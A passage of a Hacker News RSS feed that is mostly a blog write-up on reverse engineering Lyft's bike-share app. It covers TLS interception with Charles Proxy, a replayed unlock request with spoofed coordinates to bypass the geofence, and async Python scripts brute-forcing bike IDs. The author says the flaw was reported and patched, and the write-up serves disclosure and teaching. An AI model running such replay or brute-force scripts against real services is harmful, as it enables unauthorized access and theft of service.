      &lt;item&gt; Notifications &lt;tool-tip&gt;You must be signed in to change notification settings&lt;/tool-tip&gt;&lt;/item&gt;
      &lt;item&gt;Fork 10.7k&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Description&lt;/head&gt;
    &lt;head rend="h3"&gt;What would you like to be added?&lt;/head&gt;
    &lt;p&gt;Adds native recognition for JetBrains IDE as a supported IDE environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why is this needed?&lt;/head&gt;
    &lt;p&gt;Currently, Gemini CLI restricts IDE integration features to environments where TERM_PROGRAM is vscode (or other hardcoded values). This forces 3rd-party integrations like jetbrains-ide-companion to mock VS Code by spoofing environment variables to enable core features, otherwise it could not be discovered by Gemini CLI.&lt;/p&gt;
    &lt;p&gt;For some reason, the process detection is not working properly on windows/linux (, reported by users here JetBrains Plugin Review and here #9273 , and a few other bug report email i've received), which making this native IDE detection logic a MUST do for gemini-cli discover and connect to IDE via environmental variables instead of port info file.&lt;/p&gt;
    &lt;p&gt;This PR adds JetBrains IDE Series to the IDE_DEFINITIONS and updates the detection logic to recognize TERMINAL_EMULATOR=JetBrains-JediTerm as a first-class supported environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Additional context&lt;/head&gt;
    &lt;p&gt;Inspired by #16083&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721179</guid><pubDate>Thu, 22 Jan 2026 16:10:20 +0000</pubDate></item><item><title>Show HN: Text-to-video model from scratch (2 brothers, 2 years, 2B params)</title><link>https://huggingface.co/collections/Linum-AI/linum-v2-2b-text-to-video</link><description>&lt;doc fingerprint="745d5508e730e637"&gt;
  &lt;main&gt;
    &lt;p&gt;Hugging Face Models Datasets Spaces Community Docs Enterprise Pricing Log In Sign Up Linum-AI 's Collections Linum v2 (2B, text-to-video) Linum v2 (2B, text-to-video) updated about 6 hours ago 360p or 720p, 2-5 seconds, Apache 2.0 Upvote 1 Linum-AI/linum-v2-360p Text-to-Video • Updated 2 days ago • 4 Linum-AI/linum-v2-720p Text-to-Video • Updated 3 days ago • 7 Upvote 1 Share collection View history Collection guide Browse collections&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721488</guid><pubDate>Thu, 22 Jan 2026 16:31:47 +0000</pubDate></item><item><title>Reverse engineering Lyft Bikes for fun (and profit?)</title><link>https://ilanbigio.com/blog/lyft-bikes.html</link><description>&lt;doc fingerprint="b77dcf596807b0b5"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Reverse engineering Lyft bikes for fun (and profit?)&lt;/head&gt;
    &lt;p&gt;One cold San Francisco summer morning in Haight-Ashbury, my commute down to Market was interrupted by the sight of a lucky duck taking the last Lyft bike – again.&lt;/p&gt;
    &lt;p&gt;"I should really just wake up 15 minutes earlier", I thought, fleetingly. Then instead proceeded to spend the next month reverse engineering Lyft's private API, bypassing SSL encryption, chasing loose bikes across the city, triggering an internal incident, and somehow making a profit.&lt;/p&gt;
    &lt;p&gt;I learned a lot doing this, so I'm writing it up in case you might too.&lt;/p&gt;
    &lt;head&gt;Technical summary, for the impatient (spoilers!)&lt;/head&gt;
    &lt;p&gt;Goal: Remotely unlock a Lyft bike.&lt;/p&gt;
    &lt;p&gt;Steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Capturing iOS App Encrypted Traffic – to re-construct request&lt;/item&gt;
      &lt;item&gt;Replaying Modified Unlock Request – to bypass geofence&lt;/item&gt;
      &lt;item&gt;Brute-forcing Bike ID – since not available remotely&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Capturing iOS App Encrypted Traffic&lt;/head&gt;
    &lt;p&gt;I used Charles Proxy to capture outgoing requests from the Lyft app on my iPhone.&lt;/p&gt;
    &lt;p&gt;Charles supports &lt;code&gt;SSL Proxying&lt;/code&gt;, which injects its own
ephemeral certificates during SSL handshake, making sure requests from
both sides are being signed with keys it controls. &lt;/p&gt;
    &lt;p&gt;This allows us to decrypt, read, and re-encrypt traffic in transit.&lt;/p&gt;
    &lt;p&gt;The ephemeral certificates are signed by a Charles Certificate Authority, which needs to be installed on your phone so Charles's certificates are not rejected. SSL traffic content is then viewable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Replaying Modified Unlock Request&lt;/head&gt;
    &lt;p&gt;From the Charles captures, we see the unlock request uses a &lt;code&gt;rent&lt;/code&gt; endpoint with the following structure:&lt;/p&gt;
    &lt;code&gt;POST "https://layer.bicyclesharing.net/mobile/v2/fgb/rent"

HEADERS
{
  "api-key": "sk-XXXXX",
  "authorization": "bearer-XXXXX",
  ...
}

DATA
{
  "userLocation": { "lat": 37.7714859, "lon": -122.4449036 },
  "qrCode": { "memberId": "user-XXXXX", "qrCode": "12345" },
  ...
}&lt;/code&gt;
    &lt;p&gt;A simple python replay script:&lt;/p&gt;
    &lt;code&gt;import requests

url="https://layer.bicyclesharing.net/mobile/v2/fgb/rent"

headers={
  "api-key": "sk-XXXXX",
  "authorization": "bearer-XXXXX",
}

station_coords = { "lat": 37.7730627, "lon": -122.4390777 }    # from maps
bike_id = "12345"                                              # dummy id

data={
  "userLocation": station_coords,
  "qrCode": { "memberId": "user-XXXXX", "qrCode":  bike_id},
}

requests.post(url, headers=headers, json=data)&lt;/code&gt;
    &lt;head rend="h2"&gt;Brute-forcing Bike ID&lt;/head&gt;
    &lt;p&gt;Bike IDs are only accessible through the physical bikes (not counting eBikes, which were out of scope), to unlock one remotely, we need to brute force it. Five-digit IDs, but in practice only the &lt;code&gt;10000&lt;/code&gt; to &lt;code&gt;20000&lt;/code&gt; range is used, so 10,000 IDs to
try.&lt;/p&gt;
    &lt;p&gt;A naive implementation takes ~3 hours:&lt;/p&gt;
    &lt;code&gt;def payload(i):
    return {
        "userLocation": station_coords,
        "qrCode": { "memberId": "mem123", "qrCode":  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)&lt;/code&gt;
    &lt;p&gt;But we can use &lt;code&gt;asyncio&lt;/code&gt; and &lt;code&gt;aiohttp&lt;/code&gt; to
reduce that to ~15 seconds:&lt;/p&gt;
    &lt;code&gt;import asyncio, aiohttp

async def send_one(session, i):                              # non-blocking
  async with session.post(url, headers=headers, json=payload(i)): pass

async def main():
  async with aiohttp.ClientSession() as s:
    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
    await asyncio.gather(*tasks)                             # wait for all

asyncio.run(main())&lt;/code&gt;
    &lt;p&gt;Et voilà.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Disclaimer: This writeup is meant for educational purposes only. Vulnerabilities discussed here were disclosed to Lyft in 2019, who promptly responded and patched them. Not long after, they also introduced bike reservations as an official feature, solving my original problem and rendering the below techniques obsolete.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Table Of Contents&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Acquisition&lt;/item&gt;
      &lt;item&gt;Intercepting iOS App Requests&lt;/item&gt;
      &lt;item&gt;Spoofing SSL Root Certificate Authorities&lt;/item&gt;
      &lt;item&gt;Anatomy of a Lyft Request&lt;/item&gt;
      &lt;item&gt;I Promise it's not a Denial of Service Attack&lt;/item&gt;
      &lt;item&gt;The Test&lt;/item&gt;
      &lt;item&gt;The Good Days&lt;/item&gt;
      &lt;item&gt;Hacker One&lt;/item&gt;
      &lt;item&gt;Closing Thoughts&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Acquisition&lt;/head&gt;
    &lt;p&gt;Back in 2019 Lyft Bikes (BayWheels) used to be called Ford GoBikes, and used to be unlocked on a per-station basis. You'd generate a temporary code for a specific station on your app, then punch it into that station which would release a random bike.&lt;/p&gt;
    &lt;p&gt;My goal was to make sure nobody would take a bike while I was on-route to the station, so what if I just kept manually generating codes until I arrived? Maybe that might block others from doing so. So I tried it. No luck. Generating a code didn't block others, and that was the only way to unlock bikes. Welp, nothing left to try...&lt;/p&gt;
    &lt;p&gt;...until the next day when Lyft, who had apparently just acquired Ford GoBikes, rebranded it to BayWheels, and changed the whole unlock mechanism. All hail Lyft.&lt;/p&gt;
    &lt;p&gt;The new BayWheels map also showed bikes at stations, but now you'd unlock a bike directly by scanning a QR code on it. Each bike also had a 5-digit number you could use in case scanning didn't work. Cool! This means maybe if I typed a bike's code into my app when I left my house, it would be unlocked (and hopefully still there) by the time I arrived? So I tried it.&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;You are too far from this station.&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;They had geofenced it. I spent a solid day Googling how to spoof GPS on iPhone but no luck. I then wondered, fatefully, "what does the app actually send to Lyft during an unlock?", and my journey of capturing encrypted iOS traffic began.&lt;/p&gt;
    &lt;head rend="h2"&gt;Intercepting iOS App Requests&lt;/head&gt;
    &lt;p&gt;If you've used Chrome DevTools (aka &lt;code&gt;Inspect Element&lt;/code&gt;) you may have noticed a
&lt;code&gt;Network&lt;/code&gt; tab that lets you see the traffic between a website
and its backend. Unfortunately it's not so simple for iOS. Some helpful
Reddit posts led me to Charles
Proxy which lets you see all traffic from your computer,
and a friendly eight
sentences explained how to wire it up to my phone's traffic. It's
basically a consensual man-in-the-middle
attack.&lt;/p&gt;
    &lt;p&gt;First I had to forward my phone's traffic to Charles on my laptop. To do this I enabled "HTTP Proxy" on my phone's wifi settings, and set the &lt;code&gt;[ip]:[port]&lt;/code&gt; to &lt;code&gt;192.168.0.7:8888&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;192.168.0.7&lt;/code&gt;is my laptop's local IP which I got by running&lt;code&gt;ipconfig getifaddr en0&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;8888&lt;/code&gt;is the port Charles Proxy is running on&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Now my traffic was being forwarded to Charles Proxy and huzzah! I could see all requests coming out of my phone. But... I can't see the content? Oh, right. SSL1 encryption. The thing making sure we can trust the internet was getting in my way.&lt;/p&gt;
    &lt;head rend="h2"&gt;Spoofing SSL Root Certificate Authorities&lt;/head&gt;
    &lt;p&gt;SSL ensures traffic from the Lyft app is encrypted using the &lt;code&gt;lyft.com&lt;/code&gt; public key, so only &lt;code&gt;lyft.com&lt;/code&gt; can
decrypt it2. All modern applications &amp;amp;
websites do this, and you can find the public key on a website's SSL
certificate.&lt;/p&gt;
    &lt;p&gt;In theory, this means my traffic can't be decrypted once it leaves my phone, even by me. However, Charles has a workaround: by enabling &lt;code&gt;SSL Proxying&lt;/code&gt;, Charles will prevent the real
&lt;code&gt;lyft.com&lt;/code&gt; SSL certificate from making it back to your phone,
and instead sends a new one it generates on the fly.&lt;/p&gt;
    &lt;p&gt;This means your phone is now encrypting &lt;code&gt;lyft.com&lt;/code&gt; traffic
with Charles's public key, so Charles can decrypt it, save it, then
re-encrypt it with the real &lt;code&gt;lyft.com&lt;/code&gt; cert and
forward it along.&lt;/p&gt;
    &lt;p&gt;But there's a catch – if anyone between you and Lyft can do this (coffee shop, cell provider, etc.), how can we ever know the certificate is really Lyft's? Well, your phone will reject a certificate unless it's been signed by a Certificate Authority, endorsing it actually belongs to &lt;code&gt;lyft.com&lt;/code&gt;. These CAs are third-party organizations acting
like notaries that issue "root certificates", and your phone comes with
many trusted CA root certificates pre-installed. So Charles just asks
you to install one more root certificate – the Charles Root Certificate,
used to sign all the other certificates Charles creates. And just like
that, my phone trusts Charles, and I can see SSL traffic. 3&lt;/p&gt;
    &lt;head rend="h2"&gt;Anatomy of a Lyft Request&lt;/head&gt;
    &lt;p&gt;So, let's unlock a bike from my phone, shall we?&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;Vehicle not found.&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Right. Well, I used &lt;code&gt;12345&lt;/code&gt; as the bike ID, so that's
expected. Charles managed to capture some traffic anyway. Let's see if
we can find the unlock request.&lt;/p&gt;
    &lt;p&gt;So many requests and API routes! I see one endpoint called &lt;code&gt;rent&lt;/code&gt;, which I bet is the unlock request. Let’s look at the
contents.&lt;/p&gt;
    &lt;code&gt;POST "https://layer.bicyclesharing.net/mobile/v2/fgb/rent"

HEADERS
{
  "api-key": "sk-XXXXX",
  "authorization": "bearer-XXXXX",
  ...
}

DATA
{
  "userLocation": { "lat": 37.7714859, "lon": -122.4449036 },
  "qrCode": { "memberId": "user-XXXXX", "qrCode": "12345" },
  ...
}&lt;/code&gt;
    &lt;p&gt;Yup, looks like it is. Look at these fields (I omitted the unrelated, redacted the sensitive.) There's some auth in the headers (&lt;code&gt;api-key&lt;/code&gt;, &lt;code&gt;authorization&lt;/code&gt;), the bike
&lt;code&gt;qrCode&lt;/code&gt; I used (&lt;code&gt;12345&lt;/code&gt;), a &lt;code&gt;memberId&lt;/code&gt;
which I assume identifies my account, and... &lt;code&gt;userLocation&lt;/code&gt;
coordinates! Bingo. Now I just need to replay that request with a python
script, but set the &lt;code&gt;lat&lt;/code&gt;, &lt;code&gt;lon&lt;/code&gt; to be right next
to the station (whose coordinates I got using google maps).&lt;/p&gt;
    &lt;code&gt;import requests

url="https://layer.bicyclesharing.net/mobile/v2/fgb/rent"

headers={
  "api-key": "sk-XXXXX",
  "authorization": "bearer-XXXXX",
}

station_coords = { "lat": 37.7730627, "lon": -122.4390777 }    # from maps
bike_id = "12345"                                              # dummy id

data={
  "userLocation": station_coords,
  "qrCode": { "memberId": "user-XXXXX", "qrCode":  bike_id},
}

requests.post(url, headers=headers, json=data)&lt;/code&gt;
    &lt;p&gt;Sweet, now I just needed a real &lt;code&gt;bike_id&lt;/code&gt; to test it on.
It was very late at night4 but I was excited, so out I went
with my PJs, flip flops, and laptop to squat by my target bike. I found
its ID, entered it into my script, hit run, and holy shit it worked. The
bike unlocked. I re-locked it, ran back to my apartment, hit run again,
ran back, and there she was. Unlocked, and inconspicuously so. Nobody
would think to take it… but me.&lt;/p&gt;
    &lt;p&gt;I was in business.&lt;/p&gt;
    &lt;head rend="h2"&gt;I Promise it’s not a Denial of Service Attack&lt;/head&gt;
    &lt;p&gt;Except… the bike IDs are only printed on the bikes. How would I know what &lt;code&gt;bike_id&lt;/code&gt; to use without going to the station? Maybe
some other request Charles captured might have all the bike IDs at a
station? Short answer – no. Two days of digging through captured traffic
yielded no way to fetch bike IDs.5&lt;/p&gt;
    &lt;p&gt;After considering many fruitless ideas, like hiding a little camera pointed at the bikes and using OCR, I thought… could I just try all IDs? Five digits, that’s 100,000 combinations… and thinking back, I had only seen IDs between &lt;code&gt;10000&lt;/code&gt; and &lt;code&gt;20000&lt;/code&gt;. 10,000 loop
iterations is not that many for python!&lt;/p&gt;
    &lt;p&gt;This runs in less than a second:&lt;/p&gt;
    &lt;code&gt;for i in range(10_000, 20_000):
    print(i)&lt;/code&gt;
    &lt;p&gt;This, however, takes ~a second per request. So… ~three hours for 10,000 requests.&lt;/p&gt;
    &lt;code&gt;def payload(i):
    return {
        "userLocation": station_coords,
        "qrCode": { "memberId": "mem123", "qrCode":  i},
    }

def send_one(i):
    requests.post(url, headers=headers, json=payload(i))

for i in range(10_000, 20_000):
    send_one(i)&lt;/code&gt;
    &lt;p&gt;But we don’t have to wait for each request to come back – we can run them in parallel. After trying &lt;code&gt;multiprocessing&lt;/code&gt; and
&lt;code&gt;threading&lt;/code&gt;, I massaged a stack overflow code snippet I found
using &lt;code&gt;aiohttp&lt;/code&gt; to start a bunch of requests without blocking
on a response. Here’s a slightly6 simplified version.&lt;/p&gt;
    &lt;code&gt;import asyncio, aiohttp

async def send_one(session, i):                              # non-blocking
  async with session.post(url, headers=headers, json=payload(i)): pass

async def main():
  async with aiohttp.ClientSession() as s:
    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
    await asyncio.gather(*tasks)                             # wait for all

asyncio.run(main())&lt;/code&gt;
    &lt;p&gt;I benchmarked this against Postman's API (meant for testing) and it ran in 15 seconds! That's ~650 RPS. But, hm… is that too much for their servers? In April 2019 there were about 9,000 trips per day, so even if 80% of those all happened during rush hour (8-10am, 5-7pm) that's still a whopping 0.5 RPS at its peak. I'd be single-handedly 1,300x-ing their peak traffic on this endpoint. To be fair, (Google informed me,) 650 RPS is not that crazy for most servers. But a sudden spike like that might still look to Lyft like a Denial-of-Service attack...&lt;/p&gt;
    &lt;p&gt;...which it's not. Let me know if this is an issue and I'll stop.&lt;/p&gt;
    &lt;p&gt;I'm just a student, please don't call the cops.&lt;/p&gt;
    &lt;p&gt;Sincerely, Ilan&lt;/p&gt;
    &lt;p&gt;Aaaand sent7. Ok now let's run it on all the IDs.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Test&lt;/head&gt;
    &lt;p&gt;I'm about to run &lt;code&gt;python unlock_script.py&lt;/code&gt; when a thought
occurs to me: Is there any chance, however slim, that I'm about
to unlock every single Lyft Bike in and around the Bay Area? The
geofence should prevent that, in theory. Only the station at my
selected coordinates should respond. But what if it fails? What if– eh
screw it, let's live a little. 8&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;Enter ⏎&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;10,000 IDs fly through my screen.&lt;/p&gt;
    &lt;p&gt;1000 not-so-milli seconds tick by. Then, I get my first blessed&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;You are too far from this station.&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Then another. They start to trickle in, slowly at first, then suddenly flood my terminal. Ok, that's a good sign. I'm not actively unlocking the whole city. Then, another second or so pass by, until...&lt;/p&gt;
    &lt;code&gt;Bike 12539 unlocked&lt;/code&gt;
    &lt;p&gt;Hellllll yeah! Oh my freaking god it worked! It actually wor–&lt;/p&gt;
    &lt;code&gt;Bike 17322 unlocked
Done.&lt;/code&gt;
    &lt;p&gt;Wait, what? Um. Ok? Two bikes got unlocked? That's strange, my Lyft membership only allows me to unlock one bike at a time. But hey, a) I didn't unlock the whole city, and b) it worked, so what do I care. Let's go find my bikes.&lt;/p&gt;
    &lt;p&gt;And there they were. Resting peacefully in their docks, but secretly not actually locked. If someone tried scanning it, they'd just see an error and try a different one. I had accomplished what I had set out to do.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Good Days&lt;/head&gt;
    &lt;p&gt;And boy was it nice. Every morning I'd wake up, get ready for work, run my script, glance at the unlocked ID (sometimes two), leisurely stroll to the station, (re-lock the second bike if necessary), and be on my merry way.&lt;/p&gt;
    &lt;p&gt;I mostly kept this to myself, and a few trusted people including my parents, who were happy for me but nervous that I was now certainly a criminal waiting to be arrested.&lt;/p&gt;
    &lt;p&gt;But what fun, and what a pleasantly happy ending to this adventure.&lt;/p&gt;
    &lt;p&gt;What.&lt;/p&gt;
    &lt;p&gt;Oh no.&lt;/p&gt;
    &lt;p&gt;Oh no.&lt;/p&gt;
    &lt;p&gt;Panic? Panic.&lt;/p&gt;
    &lt;head rend="h2"&gt;Hacker One&lt;/head&gt;
    &lt;p&gt;I think I spent ~two and a half minutes hyperventilating before I decided to start using my brain. I hadn't intended for this to cause an issue for Lyft: I had done the math, sanity checked with Google, and even let them know in advance. Even still, this could be interpreted maliciously and it'd be nice not to get arrested. So... what to do?&lt;/p&gt;
    &lt;p&gt;Well, how do hackers avoid getting arrested? Responsible disclosure! Companies will give bounties to people who report vulnerabilities, so hackers can keep hacking legally, and companies get to fix issues. Win-win! And maybe, just maybe, this might keep me out of jail. Win-win-win!&lt;/p&gt;
    &lt;p&gt;So I found HackerOne, and immediately a problem: Lyft's vulnerability disclosure guidelines state brute-force approaches aren't eligible. In reality, my approach wasn't bypassing anything at all – I was still unlocking a bike and paying like normal. No bugs to be reported. Although... the second bike! Definitely not normal behavior, and I wasn't getting charged for it. Let's hope it's enough to show I come in peace.&lt;/p&gt;
    &lt;p&gt;Summary: This vulnerability is specifically for the BayWheels bike sharing service. By brute-forcing the https://layer.bicyclesharing.net/mobile/v2/fgb/rent endpoint, an attacker is able to unlock more than one bicycle at a given station.&lt;/p&gt;
    &lt;p&gt;Proof of Concept: Trivial.&lt;/p&gt;
    &lt;p&gt;Steps To Reproduce:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Locate relevant auth info (api-key and authorization code) from downloaded app (possibly using Charles proxy MitM).&lt;/item&gt;
      &lt;item&gt;Discover rent endpoint (also using Charles proxy).&lt;/item&gt;
      &lt;item&gt;Quickly send rent requests for all possible bike IDs.&lt;/item&gt;
      &lt;item&gt;Retrieve bike.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Impact: An attacker could unlock more than one bike without having to go through the paywall.&lt;/p&gt;
    &lt;p&gt;(Yes I'm embarrassed to say I did actually write "trivial" because I was nervous about sharing my code.)&lt;/p&gt;
    &lt;p&gt;And now we wait. Except by sheer luck9, my summer roommate was also working at Lyft (unrelated to the intern friend who messaged me), and found the thread discussing my vulnerability report. Even though Lyft could have labeled my submission ineligible due to my somewhat... unorthodox methods, their security team treated my newbie submission seriously, asked a couple follow-ups, and eventually decided to make an exception and award me a bounty of $250. They even threw in an extra $250 bonus for a "good report"!&lt;/p&gt;
    &lt;p&gt;My goodness $500 is better than jail.&lt;/p&gt;
    &lt;p&gt;In the end I did what any (relieved, not arrested) student would do with a surprise $500 and threw an absolutely stocked little house party...&lt;/p&gt;
    &lt;p&gt;...and, naturally, invited the Lyft interns.&lt;/p&gt;
    &lt;head rend="h2"&gt;Closing Thoughts&lt;/head&gt;
    &lt;p&gt;Two-bike unlock: While I never got confirmation, I believe the two-bike unlock issue was ultimately a race condition in the &lt;code&gt;rent&lt;/code&gt; endpoint. Given the
&lt;code&gt;layer.bicyclesharing.net&lt;/code&gt; URL, I'm guessing Lyft inherited
some legacy code during the Ford GoBikes which did not correctly handle
multiple simultaneous requests from the same user. I expect they have
since migrated these endpoints to their own first-party (likely more
modern) backend.&lt;/p&gt;
    &lt;p&gt;Geofence bypass: As far as I understand, there's no easy way to enforce a geofence server-side other than timing, consistency, etc. You sort of just have to trust whatever the phone tells you.&lt;/p&gt;
    &lt;p&gt;So what did I learn?&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Even scary "physical" systems have digital interfaces you may recognize.&lt;/item&gt;
      &lt;item&gt;There's few better ways to learn about a system than reverse engineering.&lt;/item&gt;
      &lt;item&gt;Curiosity and determination are unreasonably effective, and seem to create luck.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you made it to the end, you might just enjoy this stuff. So I leave you with homework: Go reverse engineer something. Just, be nice about it.&lt;/p&gt;
    &lt;p&gt;Happy hacking.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;TLS, SSL. Tomato, potato.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Slight simplification. In reality, SSL asymmetric keys are slow, so they're only used during the handshake to encrypt faster symmetric keys, which then encrypt everything else.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Even after this setup, I noticed some encrypted content was still not readable. Turns out some apps use Certificate Pinning, which means they come pre-installed with the server certificate they expect. So even if Charles intercepts the handshake, they will encrypt traffic with the pinned certificate. Pinned certs are a PAIN to get around. Glad I didn't have to.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;10:30pm in San Francisco.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Except for eBikes, which were very few at this point, and which flash very conspicuously when unlocked as I found out after having to trek to re-lock one I accidentally unlocked across the city during testing.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;I also used semaphores to limit concurrency, but they make the code harder to follow.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Maybe a slightly more professional version.↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;I did, in fact, test this out with smaller ID ranges to convince myself I wasn't unlocking bikes at other stations. But I had never run the full-range test so I was still nervous (and it sounds more exciting this way.)↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Or cosmic fate.↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I may write something every few months or so. Who knows? (You might.)&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721703</guid><pubDate>Thu, 22 Jan 2026 16:45:52 +0000</pubDate></item><item><title>Show HN: isometric.nyc – giant isometric pixel art map of NYC</title><link>https://cannoneyed.com/isometric-nyc/</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721802</guid><pubDate>Thu, 22 Jan 2026 16:52:35 +0000</pubDate></item><item><title>AnswerThis (YC F25) Is Hiring</title><link>https://www.ycombinator.com/companies/answerthis/jobs/r5VHmSC-ai-agent-orchestration</link><description>&lt;doc fingerprint="3d09585cf826800c"&gt;
  &lt;main&gt;
    &lt;p&gt;End-to-end workspace to accelerate scientific discovery&lt;/p&gt;
    &lt;p&gt;We crossed $1M ARR in 8 months. 200,000+ researchers at Stanford, MIT, and Amazon use us to do literature reviews 10x faster.&lt;lb/&gt; Now we're building something bigger: the system of record for scientists where they can find papers, analyze experiments, and write their drafts while collaborating with other scientists as well as our AI agents. &lt;lb/&gt; You should apply if you:&lt;lb/&gt; → Ship fast and learn faster &lt;lb/&gt; → Know the agentic AI stack cold (vector DBs, graph RAG, agent memory) &lt;lb/&gt; → Have built full-stack products that scaled past 1M users &lt;lb/&gt; → Actually care about accelerating scientific discovery&lt;lb/&gt; Bonus: You've published research yourself. &lt;lb/&gt; Don't apply if you:&lt;lb/&gt; → Can't be in SF, in person &lt;lb/&gt; → Haven't used the product yet &lt;lb/&gt; → Don't want to talk to customers &lt;lb/&gt; $120K-$200K + equity. We're a small team backed by YC. &lt;lb/&gt; Reach out on careers [at] answerthis.io&lt;lb/&gt; Tell us what you hate about AnswerThis, what you love, and one project you're proud of alongside your resume.&lt;lb/&gt; Science moves too slowly. Help us fix that.&lt;/p&gt;
    &lt;p&gt;We move fast. The whole process can be done in 2-3 weeks.&lt;/p&gt;
    &lt;p&gt;AnswerThis is building the system of record for scientists—where researchers can find papers, analyze experiments, and write drafts while collaborating with other scientists and AI agents.&lt;/p&gt;
    &lt;p&gt;We crossed $1M ARR in 8 months. 200,000+ researchers at Stanford, MIT, Amazon, and top institutions worldwide use us daily. We're backed by Y Combinator (F25) and cash-flow positive.&lt;/p&gt;
    &lt;p&gt;Science moves too slowly. Grant applications take months. Literature reviews take weeks. Researchers spend more time on paperwork than on discovery. We're fixing that.&lt;/p&gt;
    &lt;p&gt;You'll be joining a small, fast team in SF that ships constantly and talks to customers every day.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721897</guid><pubDate>Thu, 22 Jan 2026 17:00:40 +0000</pubDate></item><item><title>Launch HN: Constellation Space (YC W26) – AI for satellite mission assurance</title><link>https://news.ycombinator.com/item?id=46721933</link><description>&lt;doc fingerprint="22906374e6a95fca"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN! We're Kamran, Raaid, Laith, and Omeed from Constellation Space (&lt;/p&gt;https://constellation-io.com/&lt;p&gt;). We built an AI system that predicts satellite link failures before they happen. Here's a video walkthrough: &lt;/p&gt;https://www.youtube.com/watch?v=069V9fADAtM&lt;p&gt;.&lt;/p&gt;&lt;p&gt;Between us, we've spent years working on satellite operations at SpaceX, Blue Origin, and NASA. At SpaceX, we managed constellation health for Starlink. At Blue, we worked on next-gen test infra for New Glenn. At NASA, we dealt with deep space communications. The same problem kept coming up: by the time you notice a link is degrading, you've often already lost data.&lt;/p&gt;&lt;p&gt;The core issue is that satellite RF links are affected by dozens of interacting variables. A satellite passes overhead, and you need to predict whether the link will hold for the next few minutes. That depends on: the orbital geometry (elevation angle changes constantly), tropospheric attenuation (humidity affects signal loss via ITU-R P.676), rain fade (calculated via ITU-R P.618 - rain rates in mm/hr translate directly to dB of loss at Ka-band and above), ionospheric scintillation (we track the KP index from magnetometer networks), and network congestion on top of all that.&lt;/p&gt;&lt;p&gt;The traditional approach is reactive. Operators watch dashboards, and when SNR drops below a threshold, they manually reroute traffic or switch to a backup link. With 10,000 satellites in orbit today and 70,000+ projected by 2030, this doesn't scale. Our system ingests telemetry at around 100,000 messages per second from satellites, ground stations, weather radar, IoT humidity sensors, and space weather monitors. We run physics-based models in real-time - the full link budget equations, ITU atmospheric standards, orbital propagation - to compute what should be happening. Then we layer ML models on top, trained on billions of data points from actual multi-orbit operations.&lt;/p&gt;&lt;p&gt;The ML piece is where it gets interesting. We use federated learning because constellation operators (understandably) don't want to share raw telemetry. Each constellation trains local models on their own data, and we aggregate only the high-level patterns. This gives us transfer learning across different orbit types and frequency bands - learnings from LEO Ka-band links help optimize MEO or GEO operations. We can predict most link failures 3-5 minutes out with &amp;gt;90% accuracy, which gives enough time to reroute traffic before data loss. The system is fully containerized (Docker/Kubernetes) and deploys on-premise for air-gapped environments, on GovCloud (AWS GovCloud, Azure Government), or standard commercial clouds.&lt;/p&gt;&lt;p&gt;Right now we're testing with defense and commercial partners. The dashboard shows real-time link health, forecasts at 60/180/300 seconds out, and root cause analysis (is this rain fade? satellite setting below horizon? congestion?). We 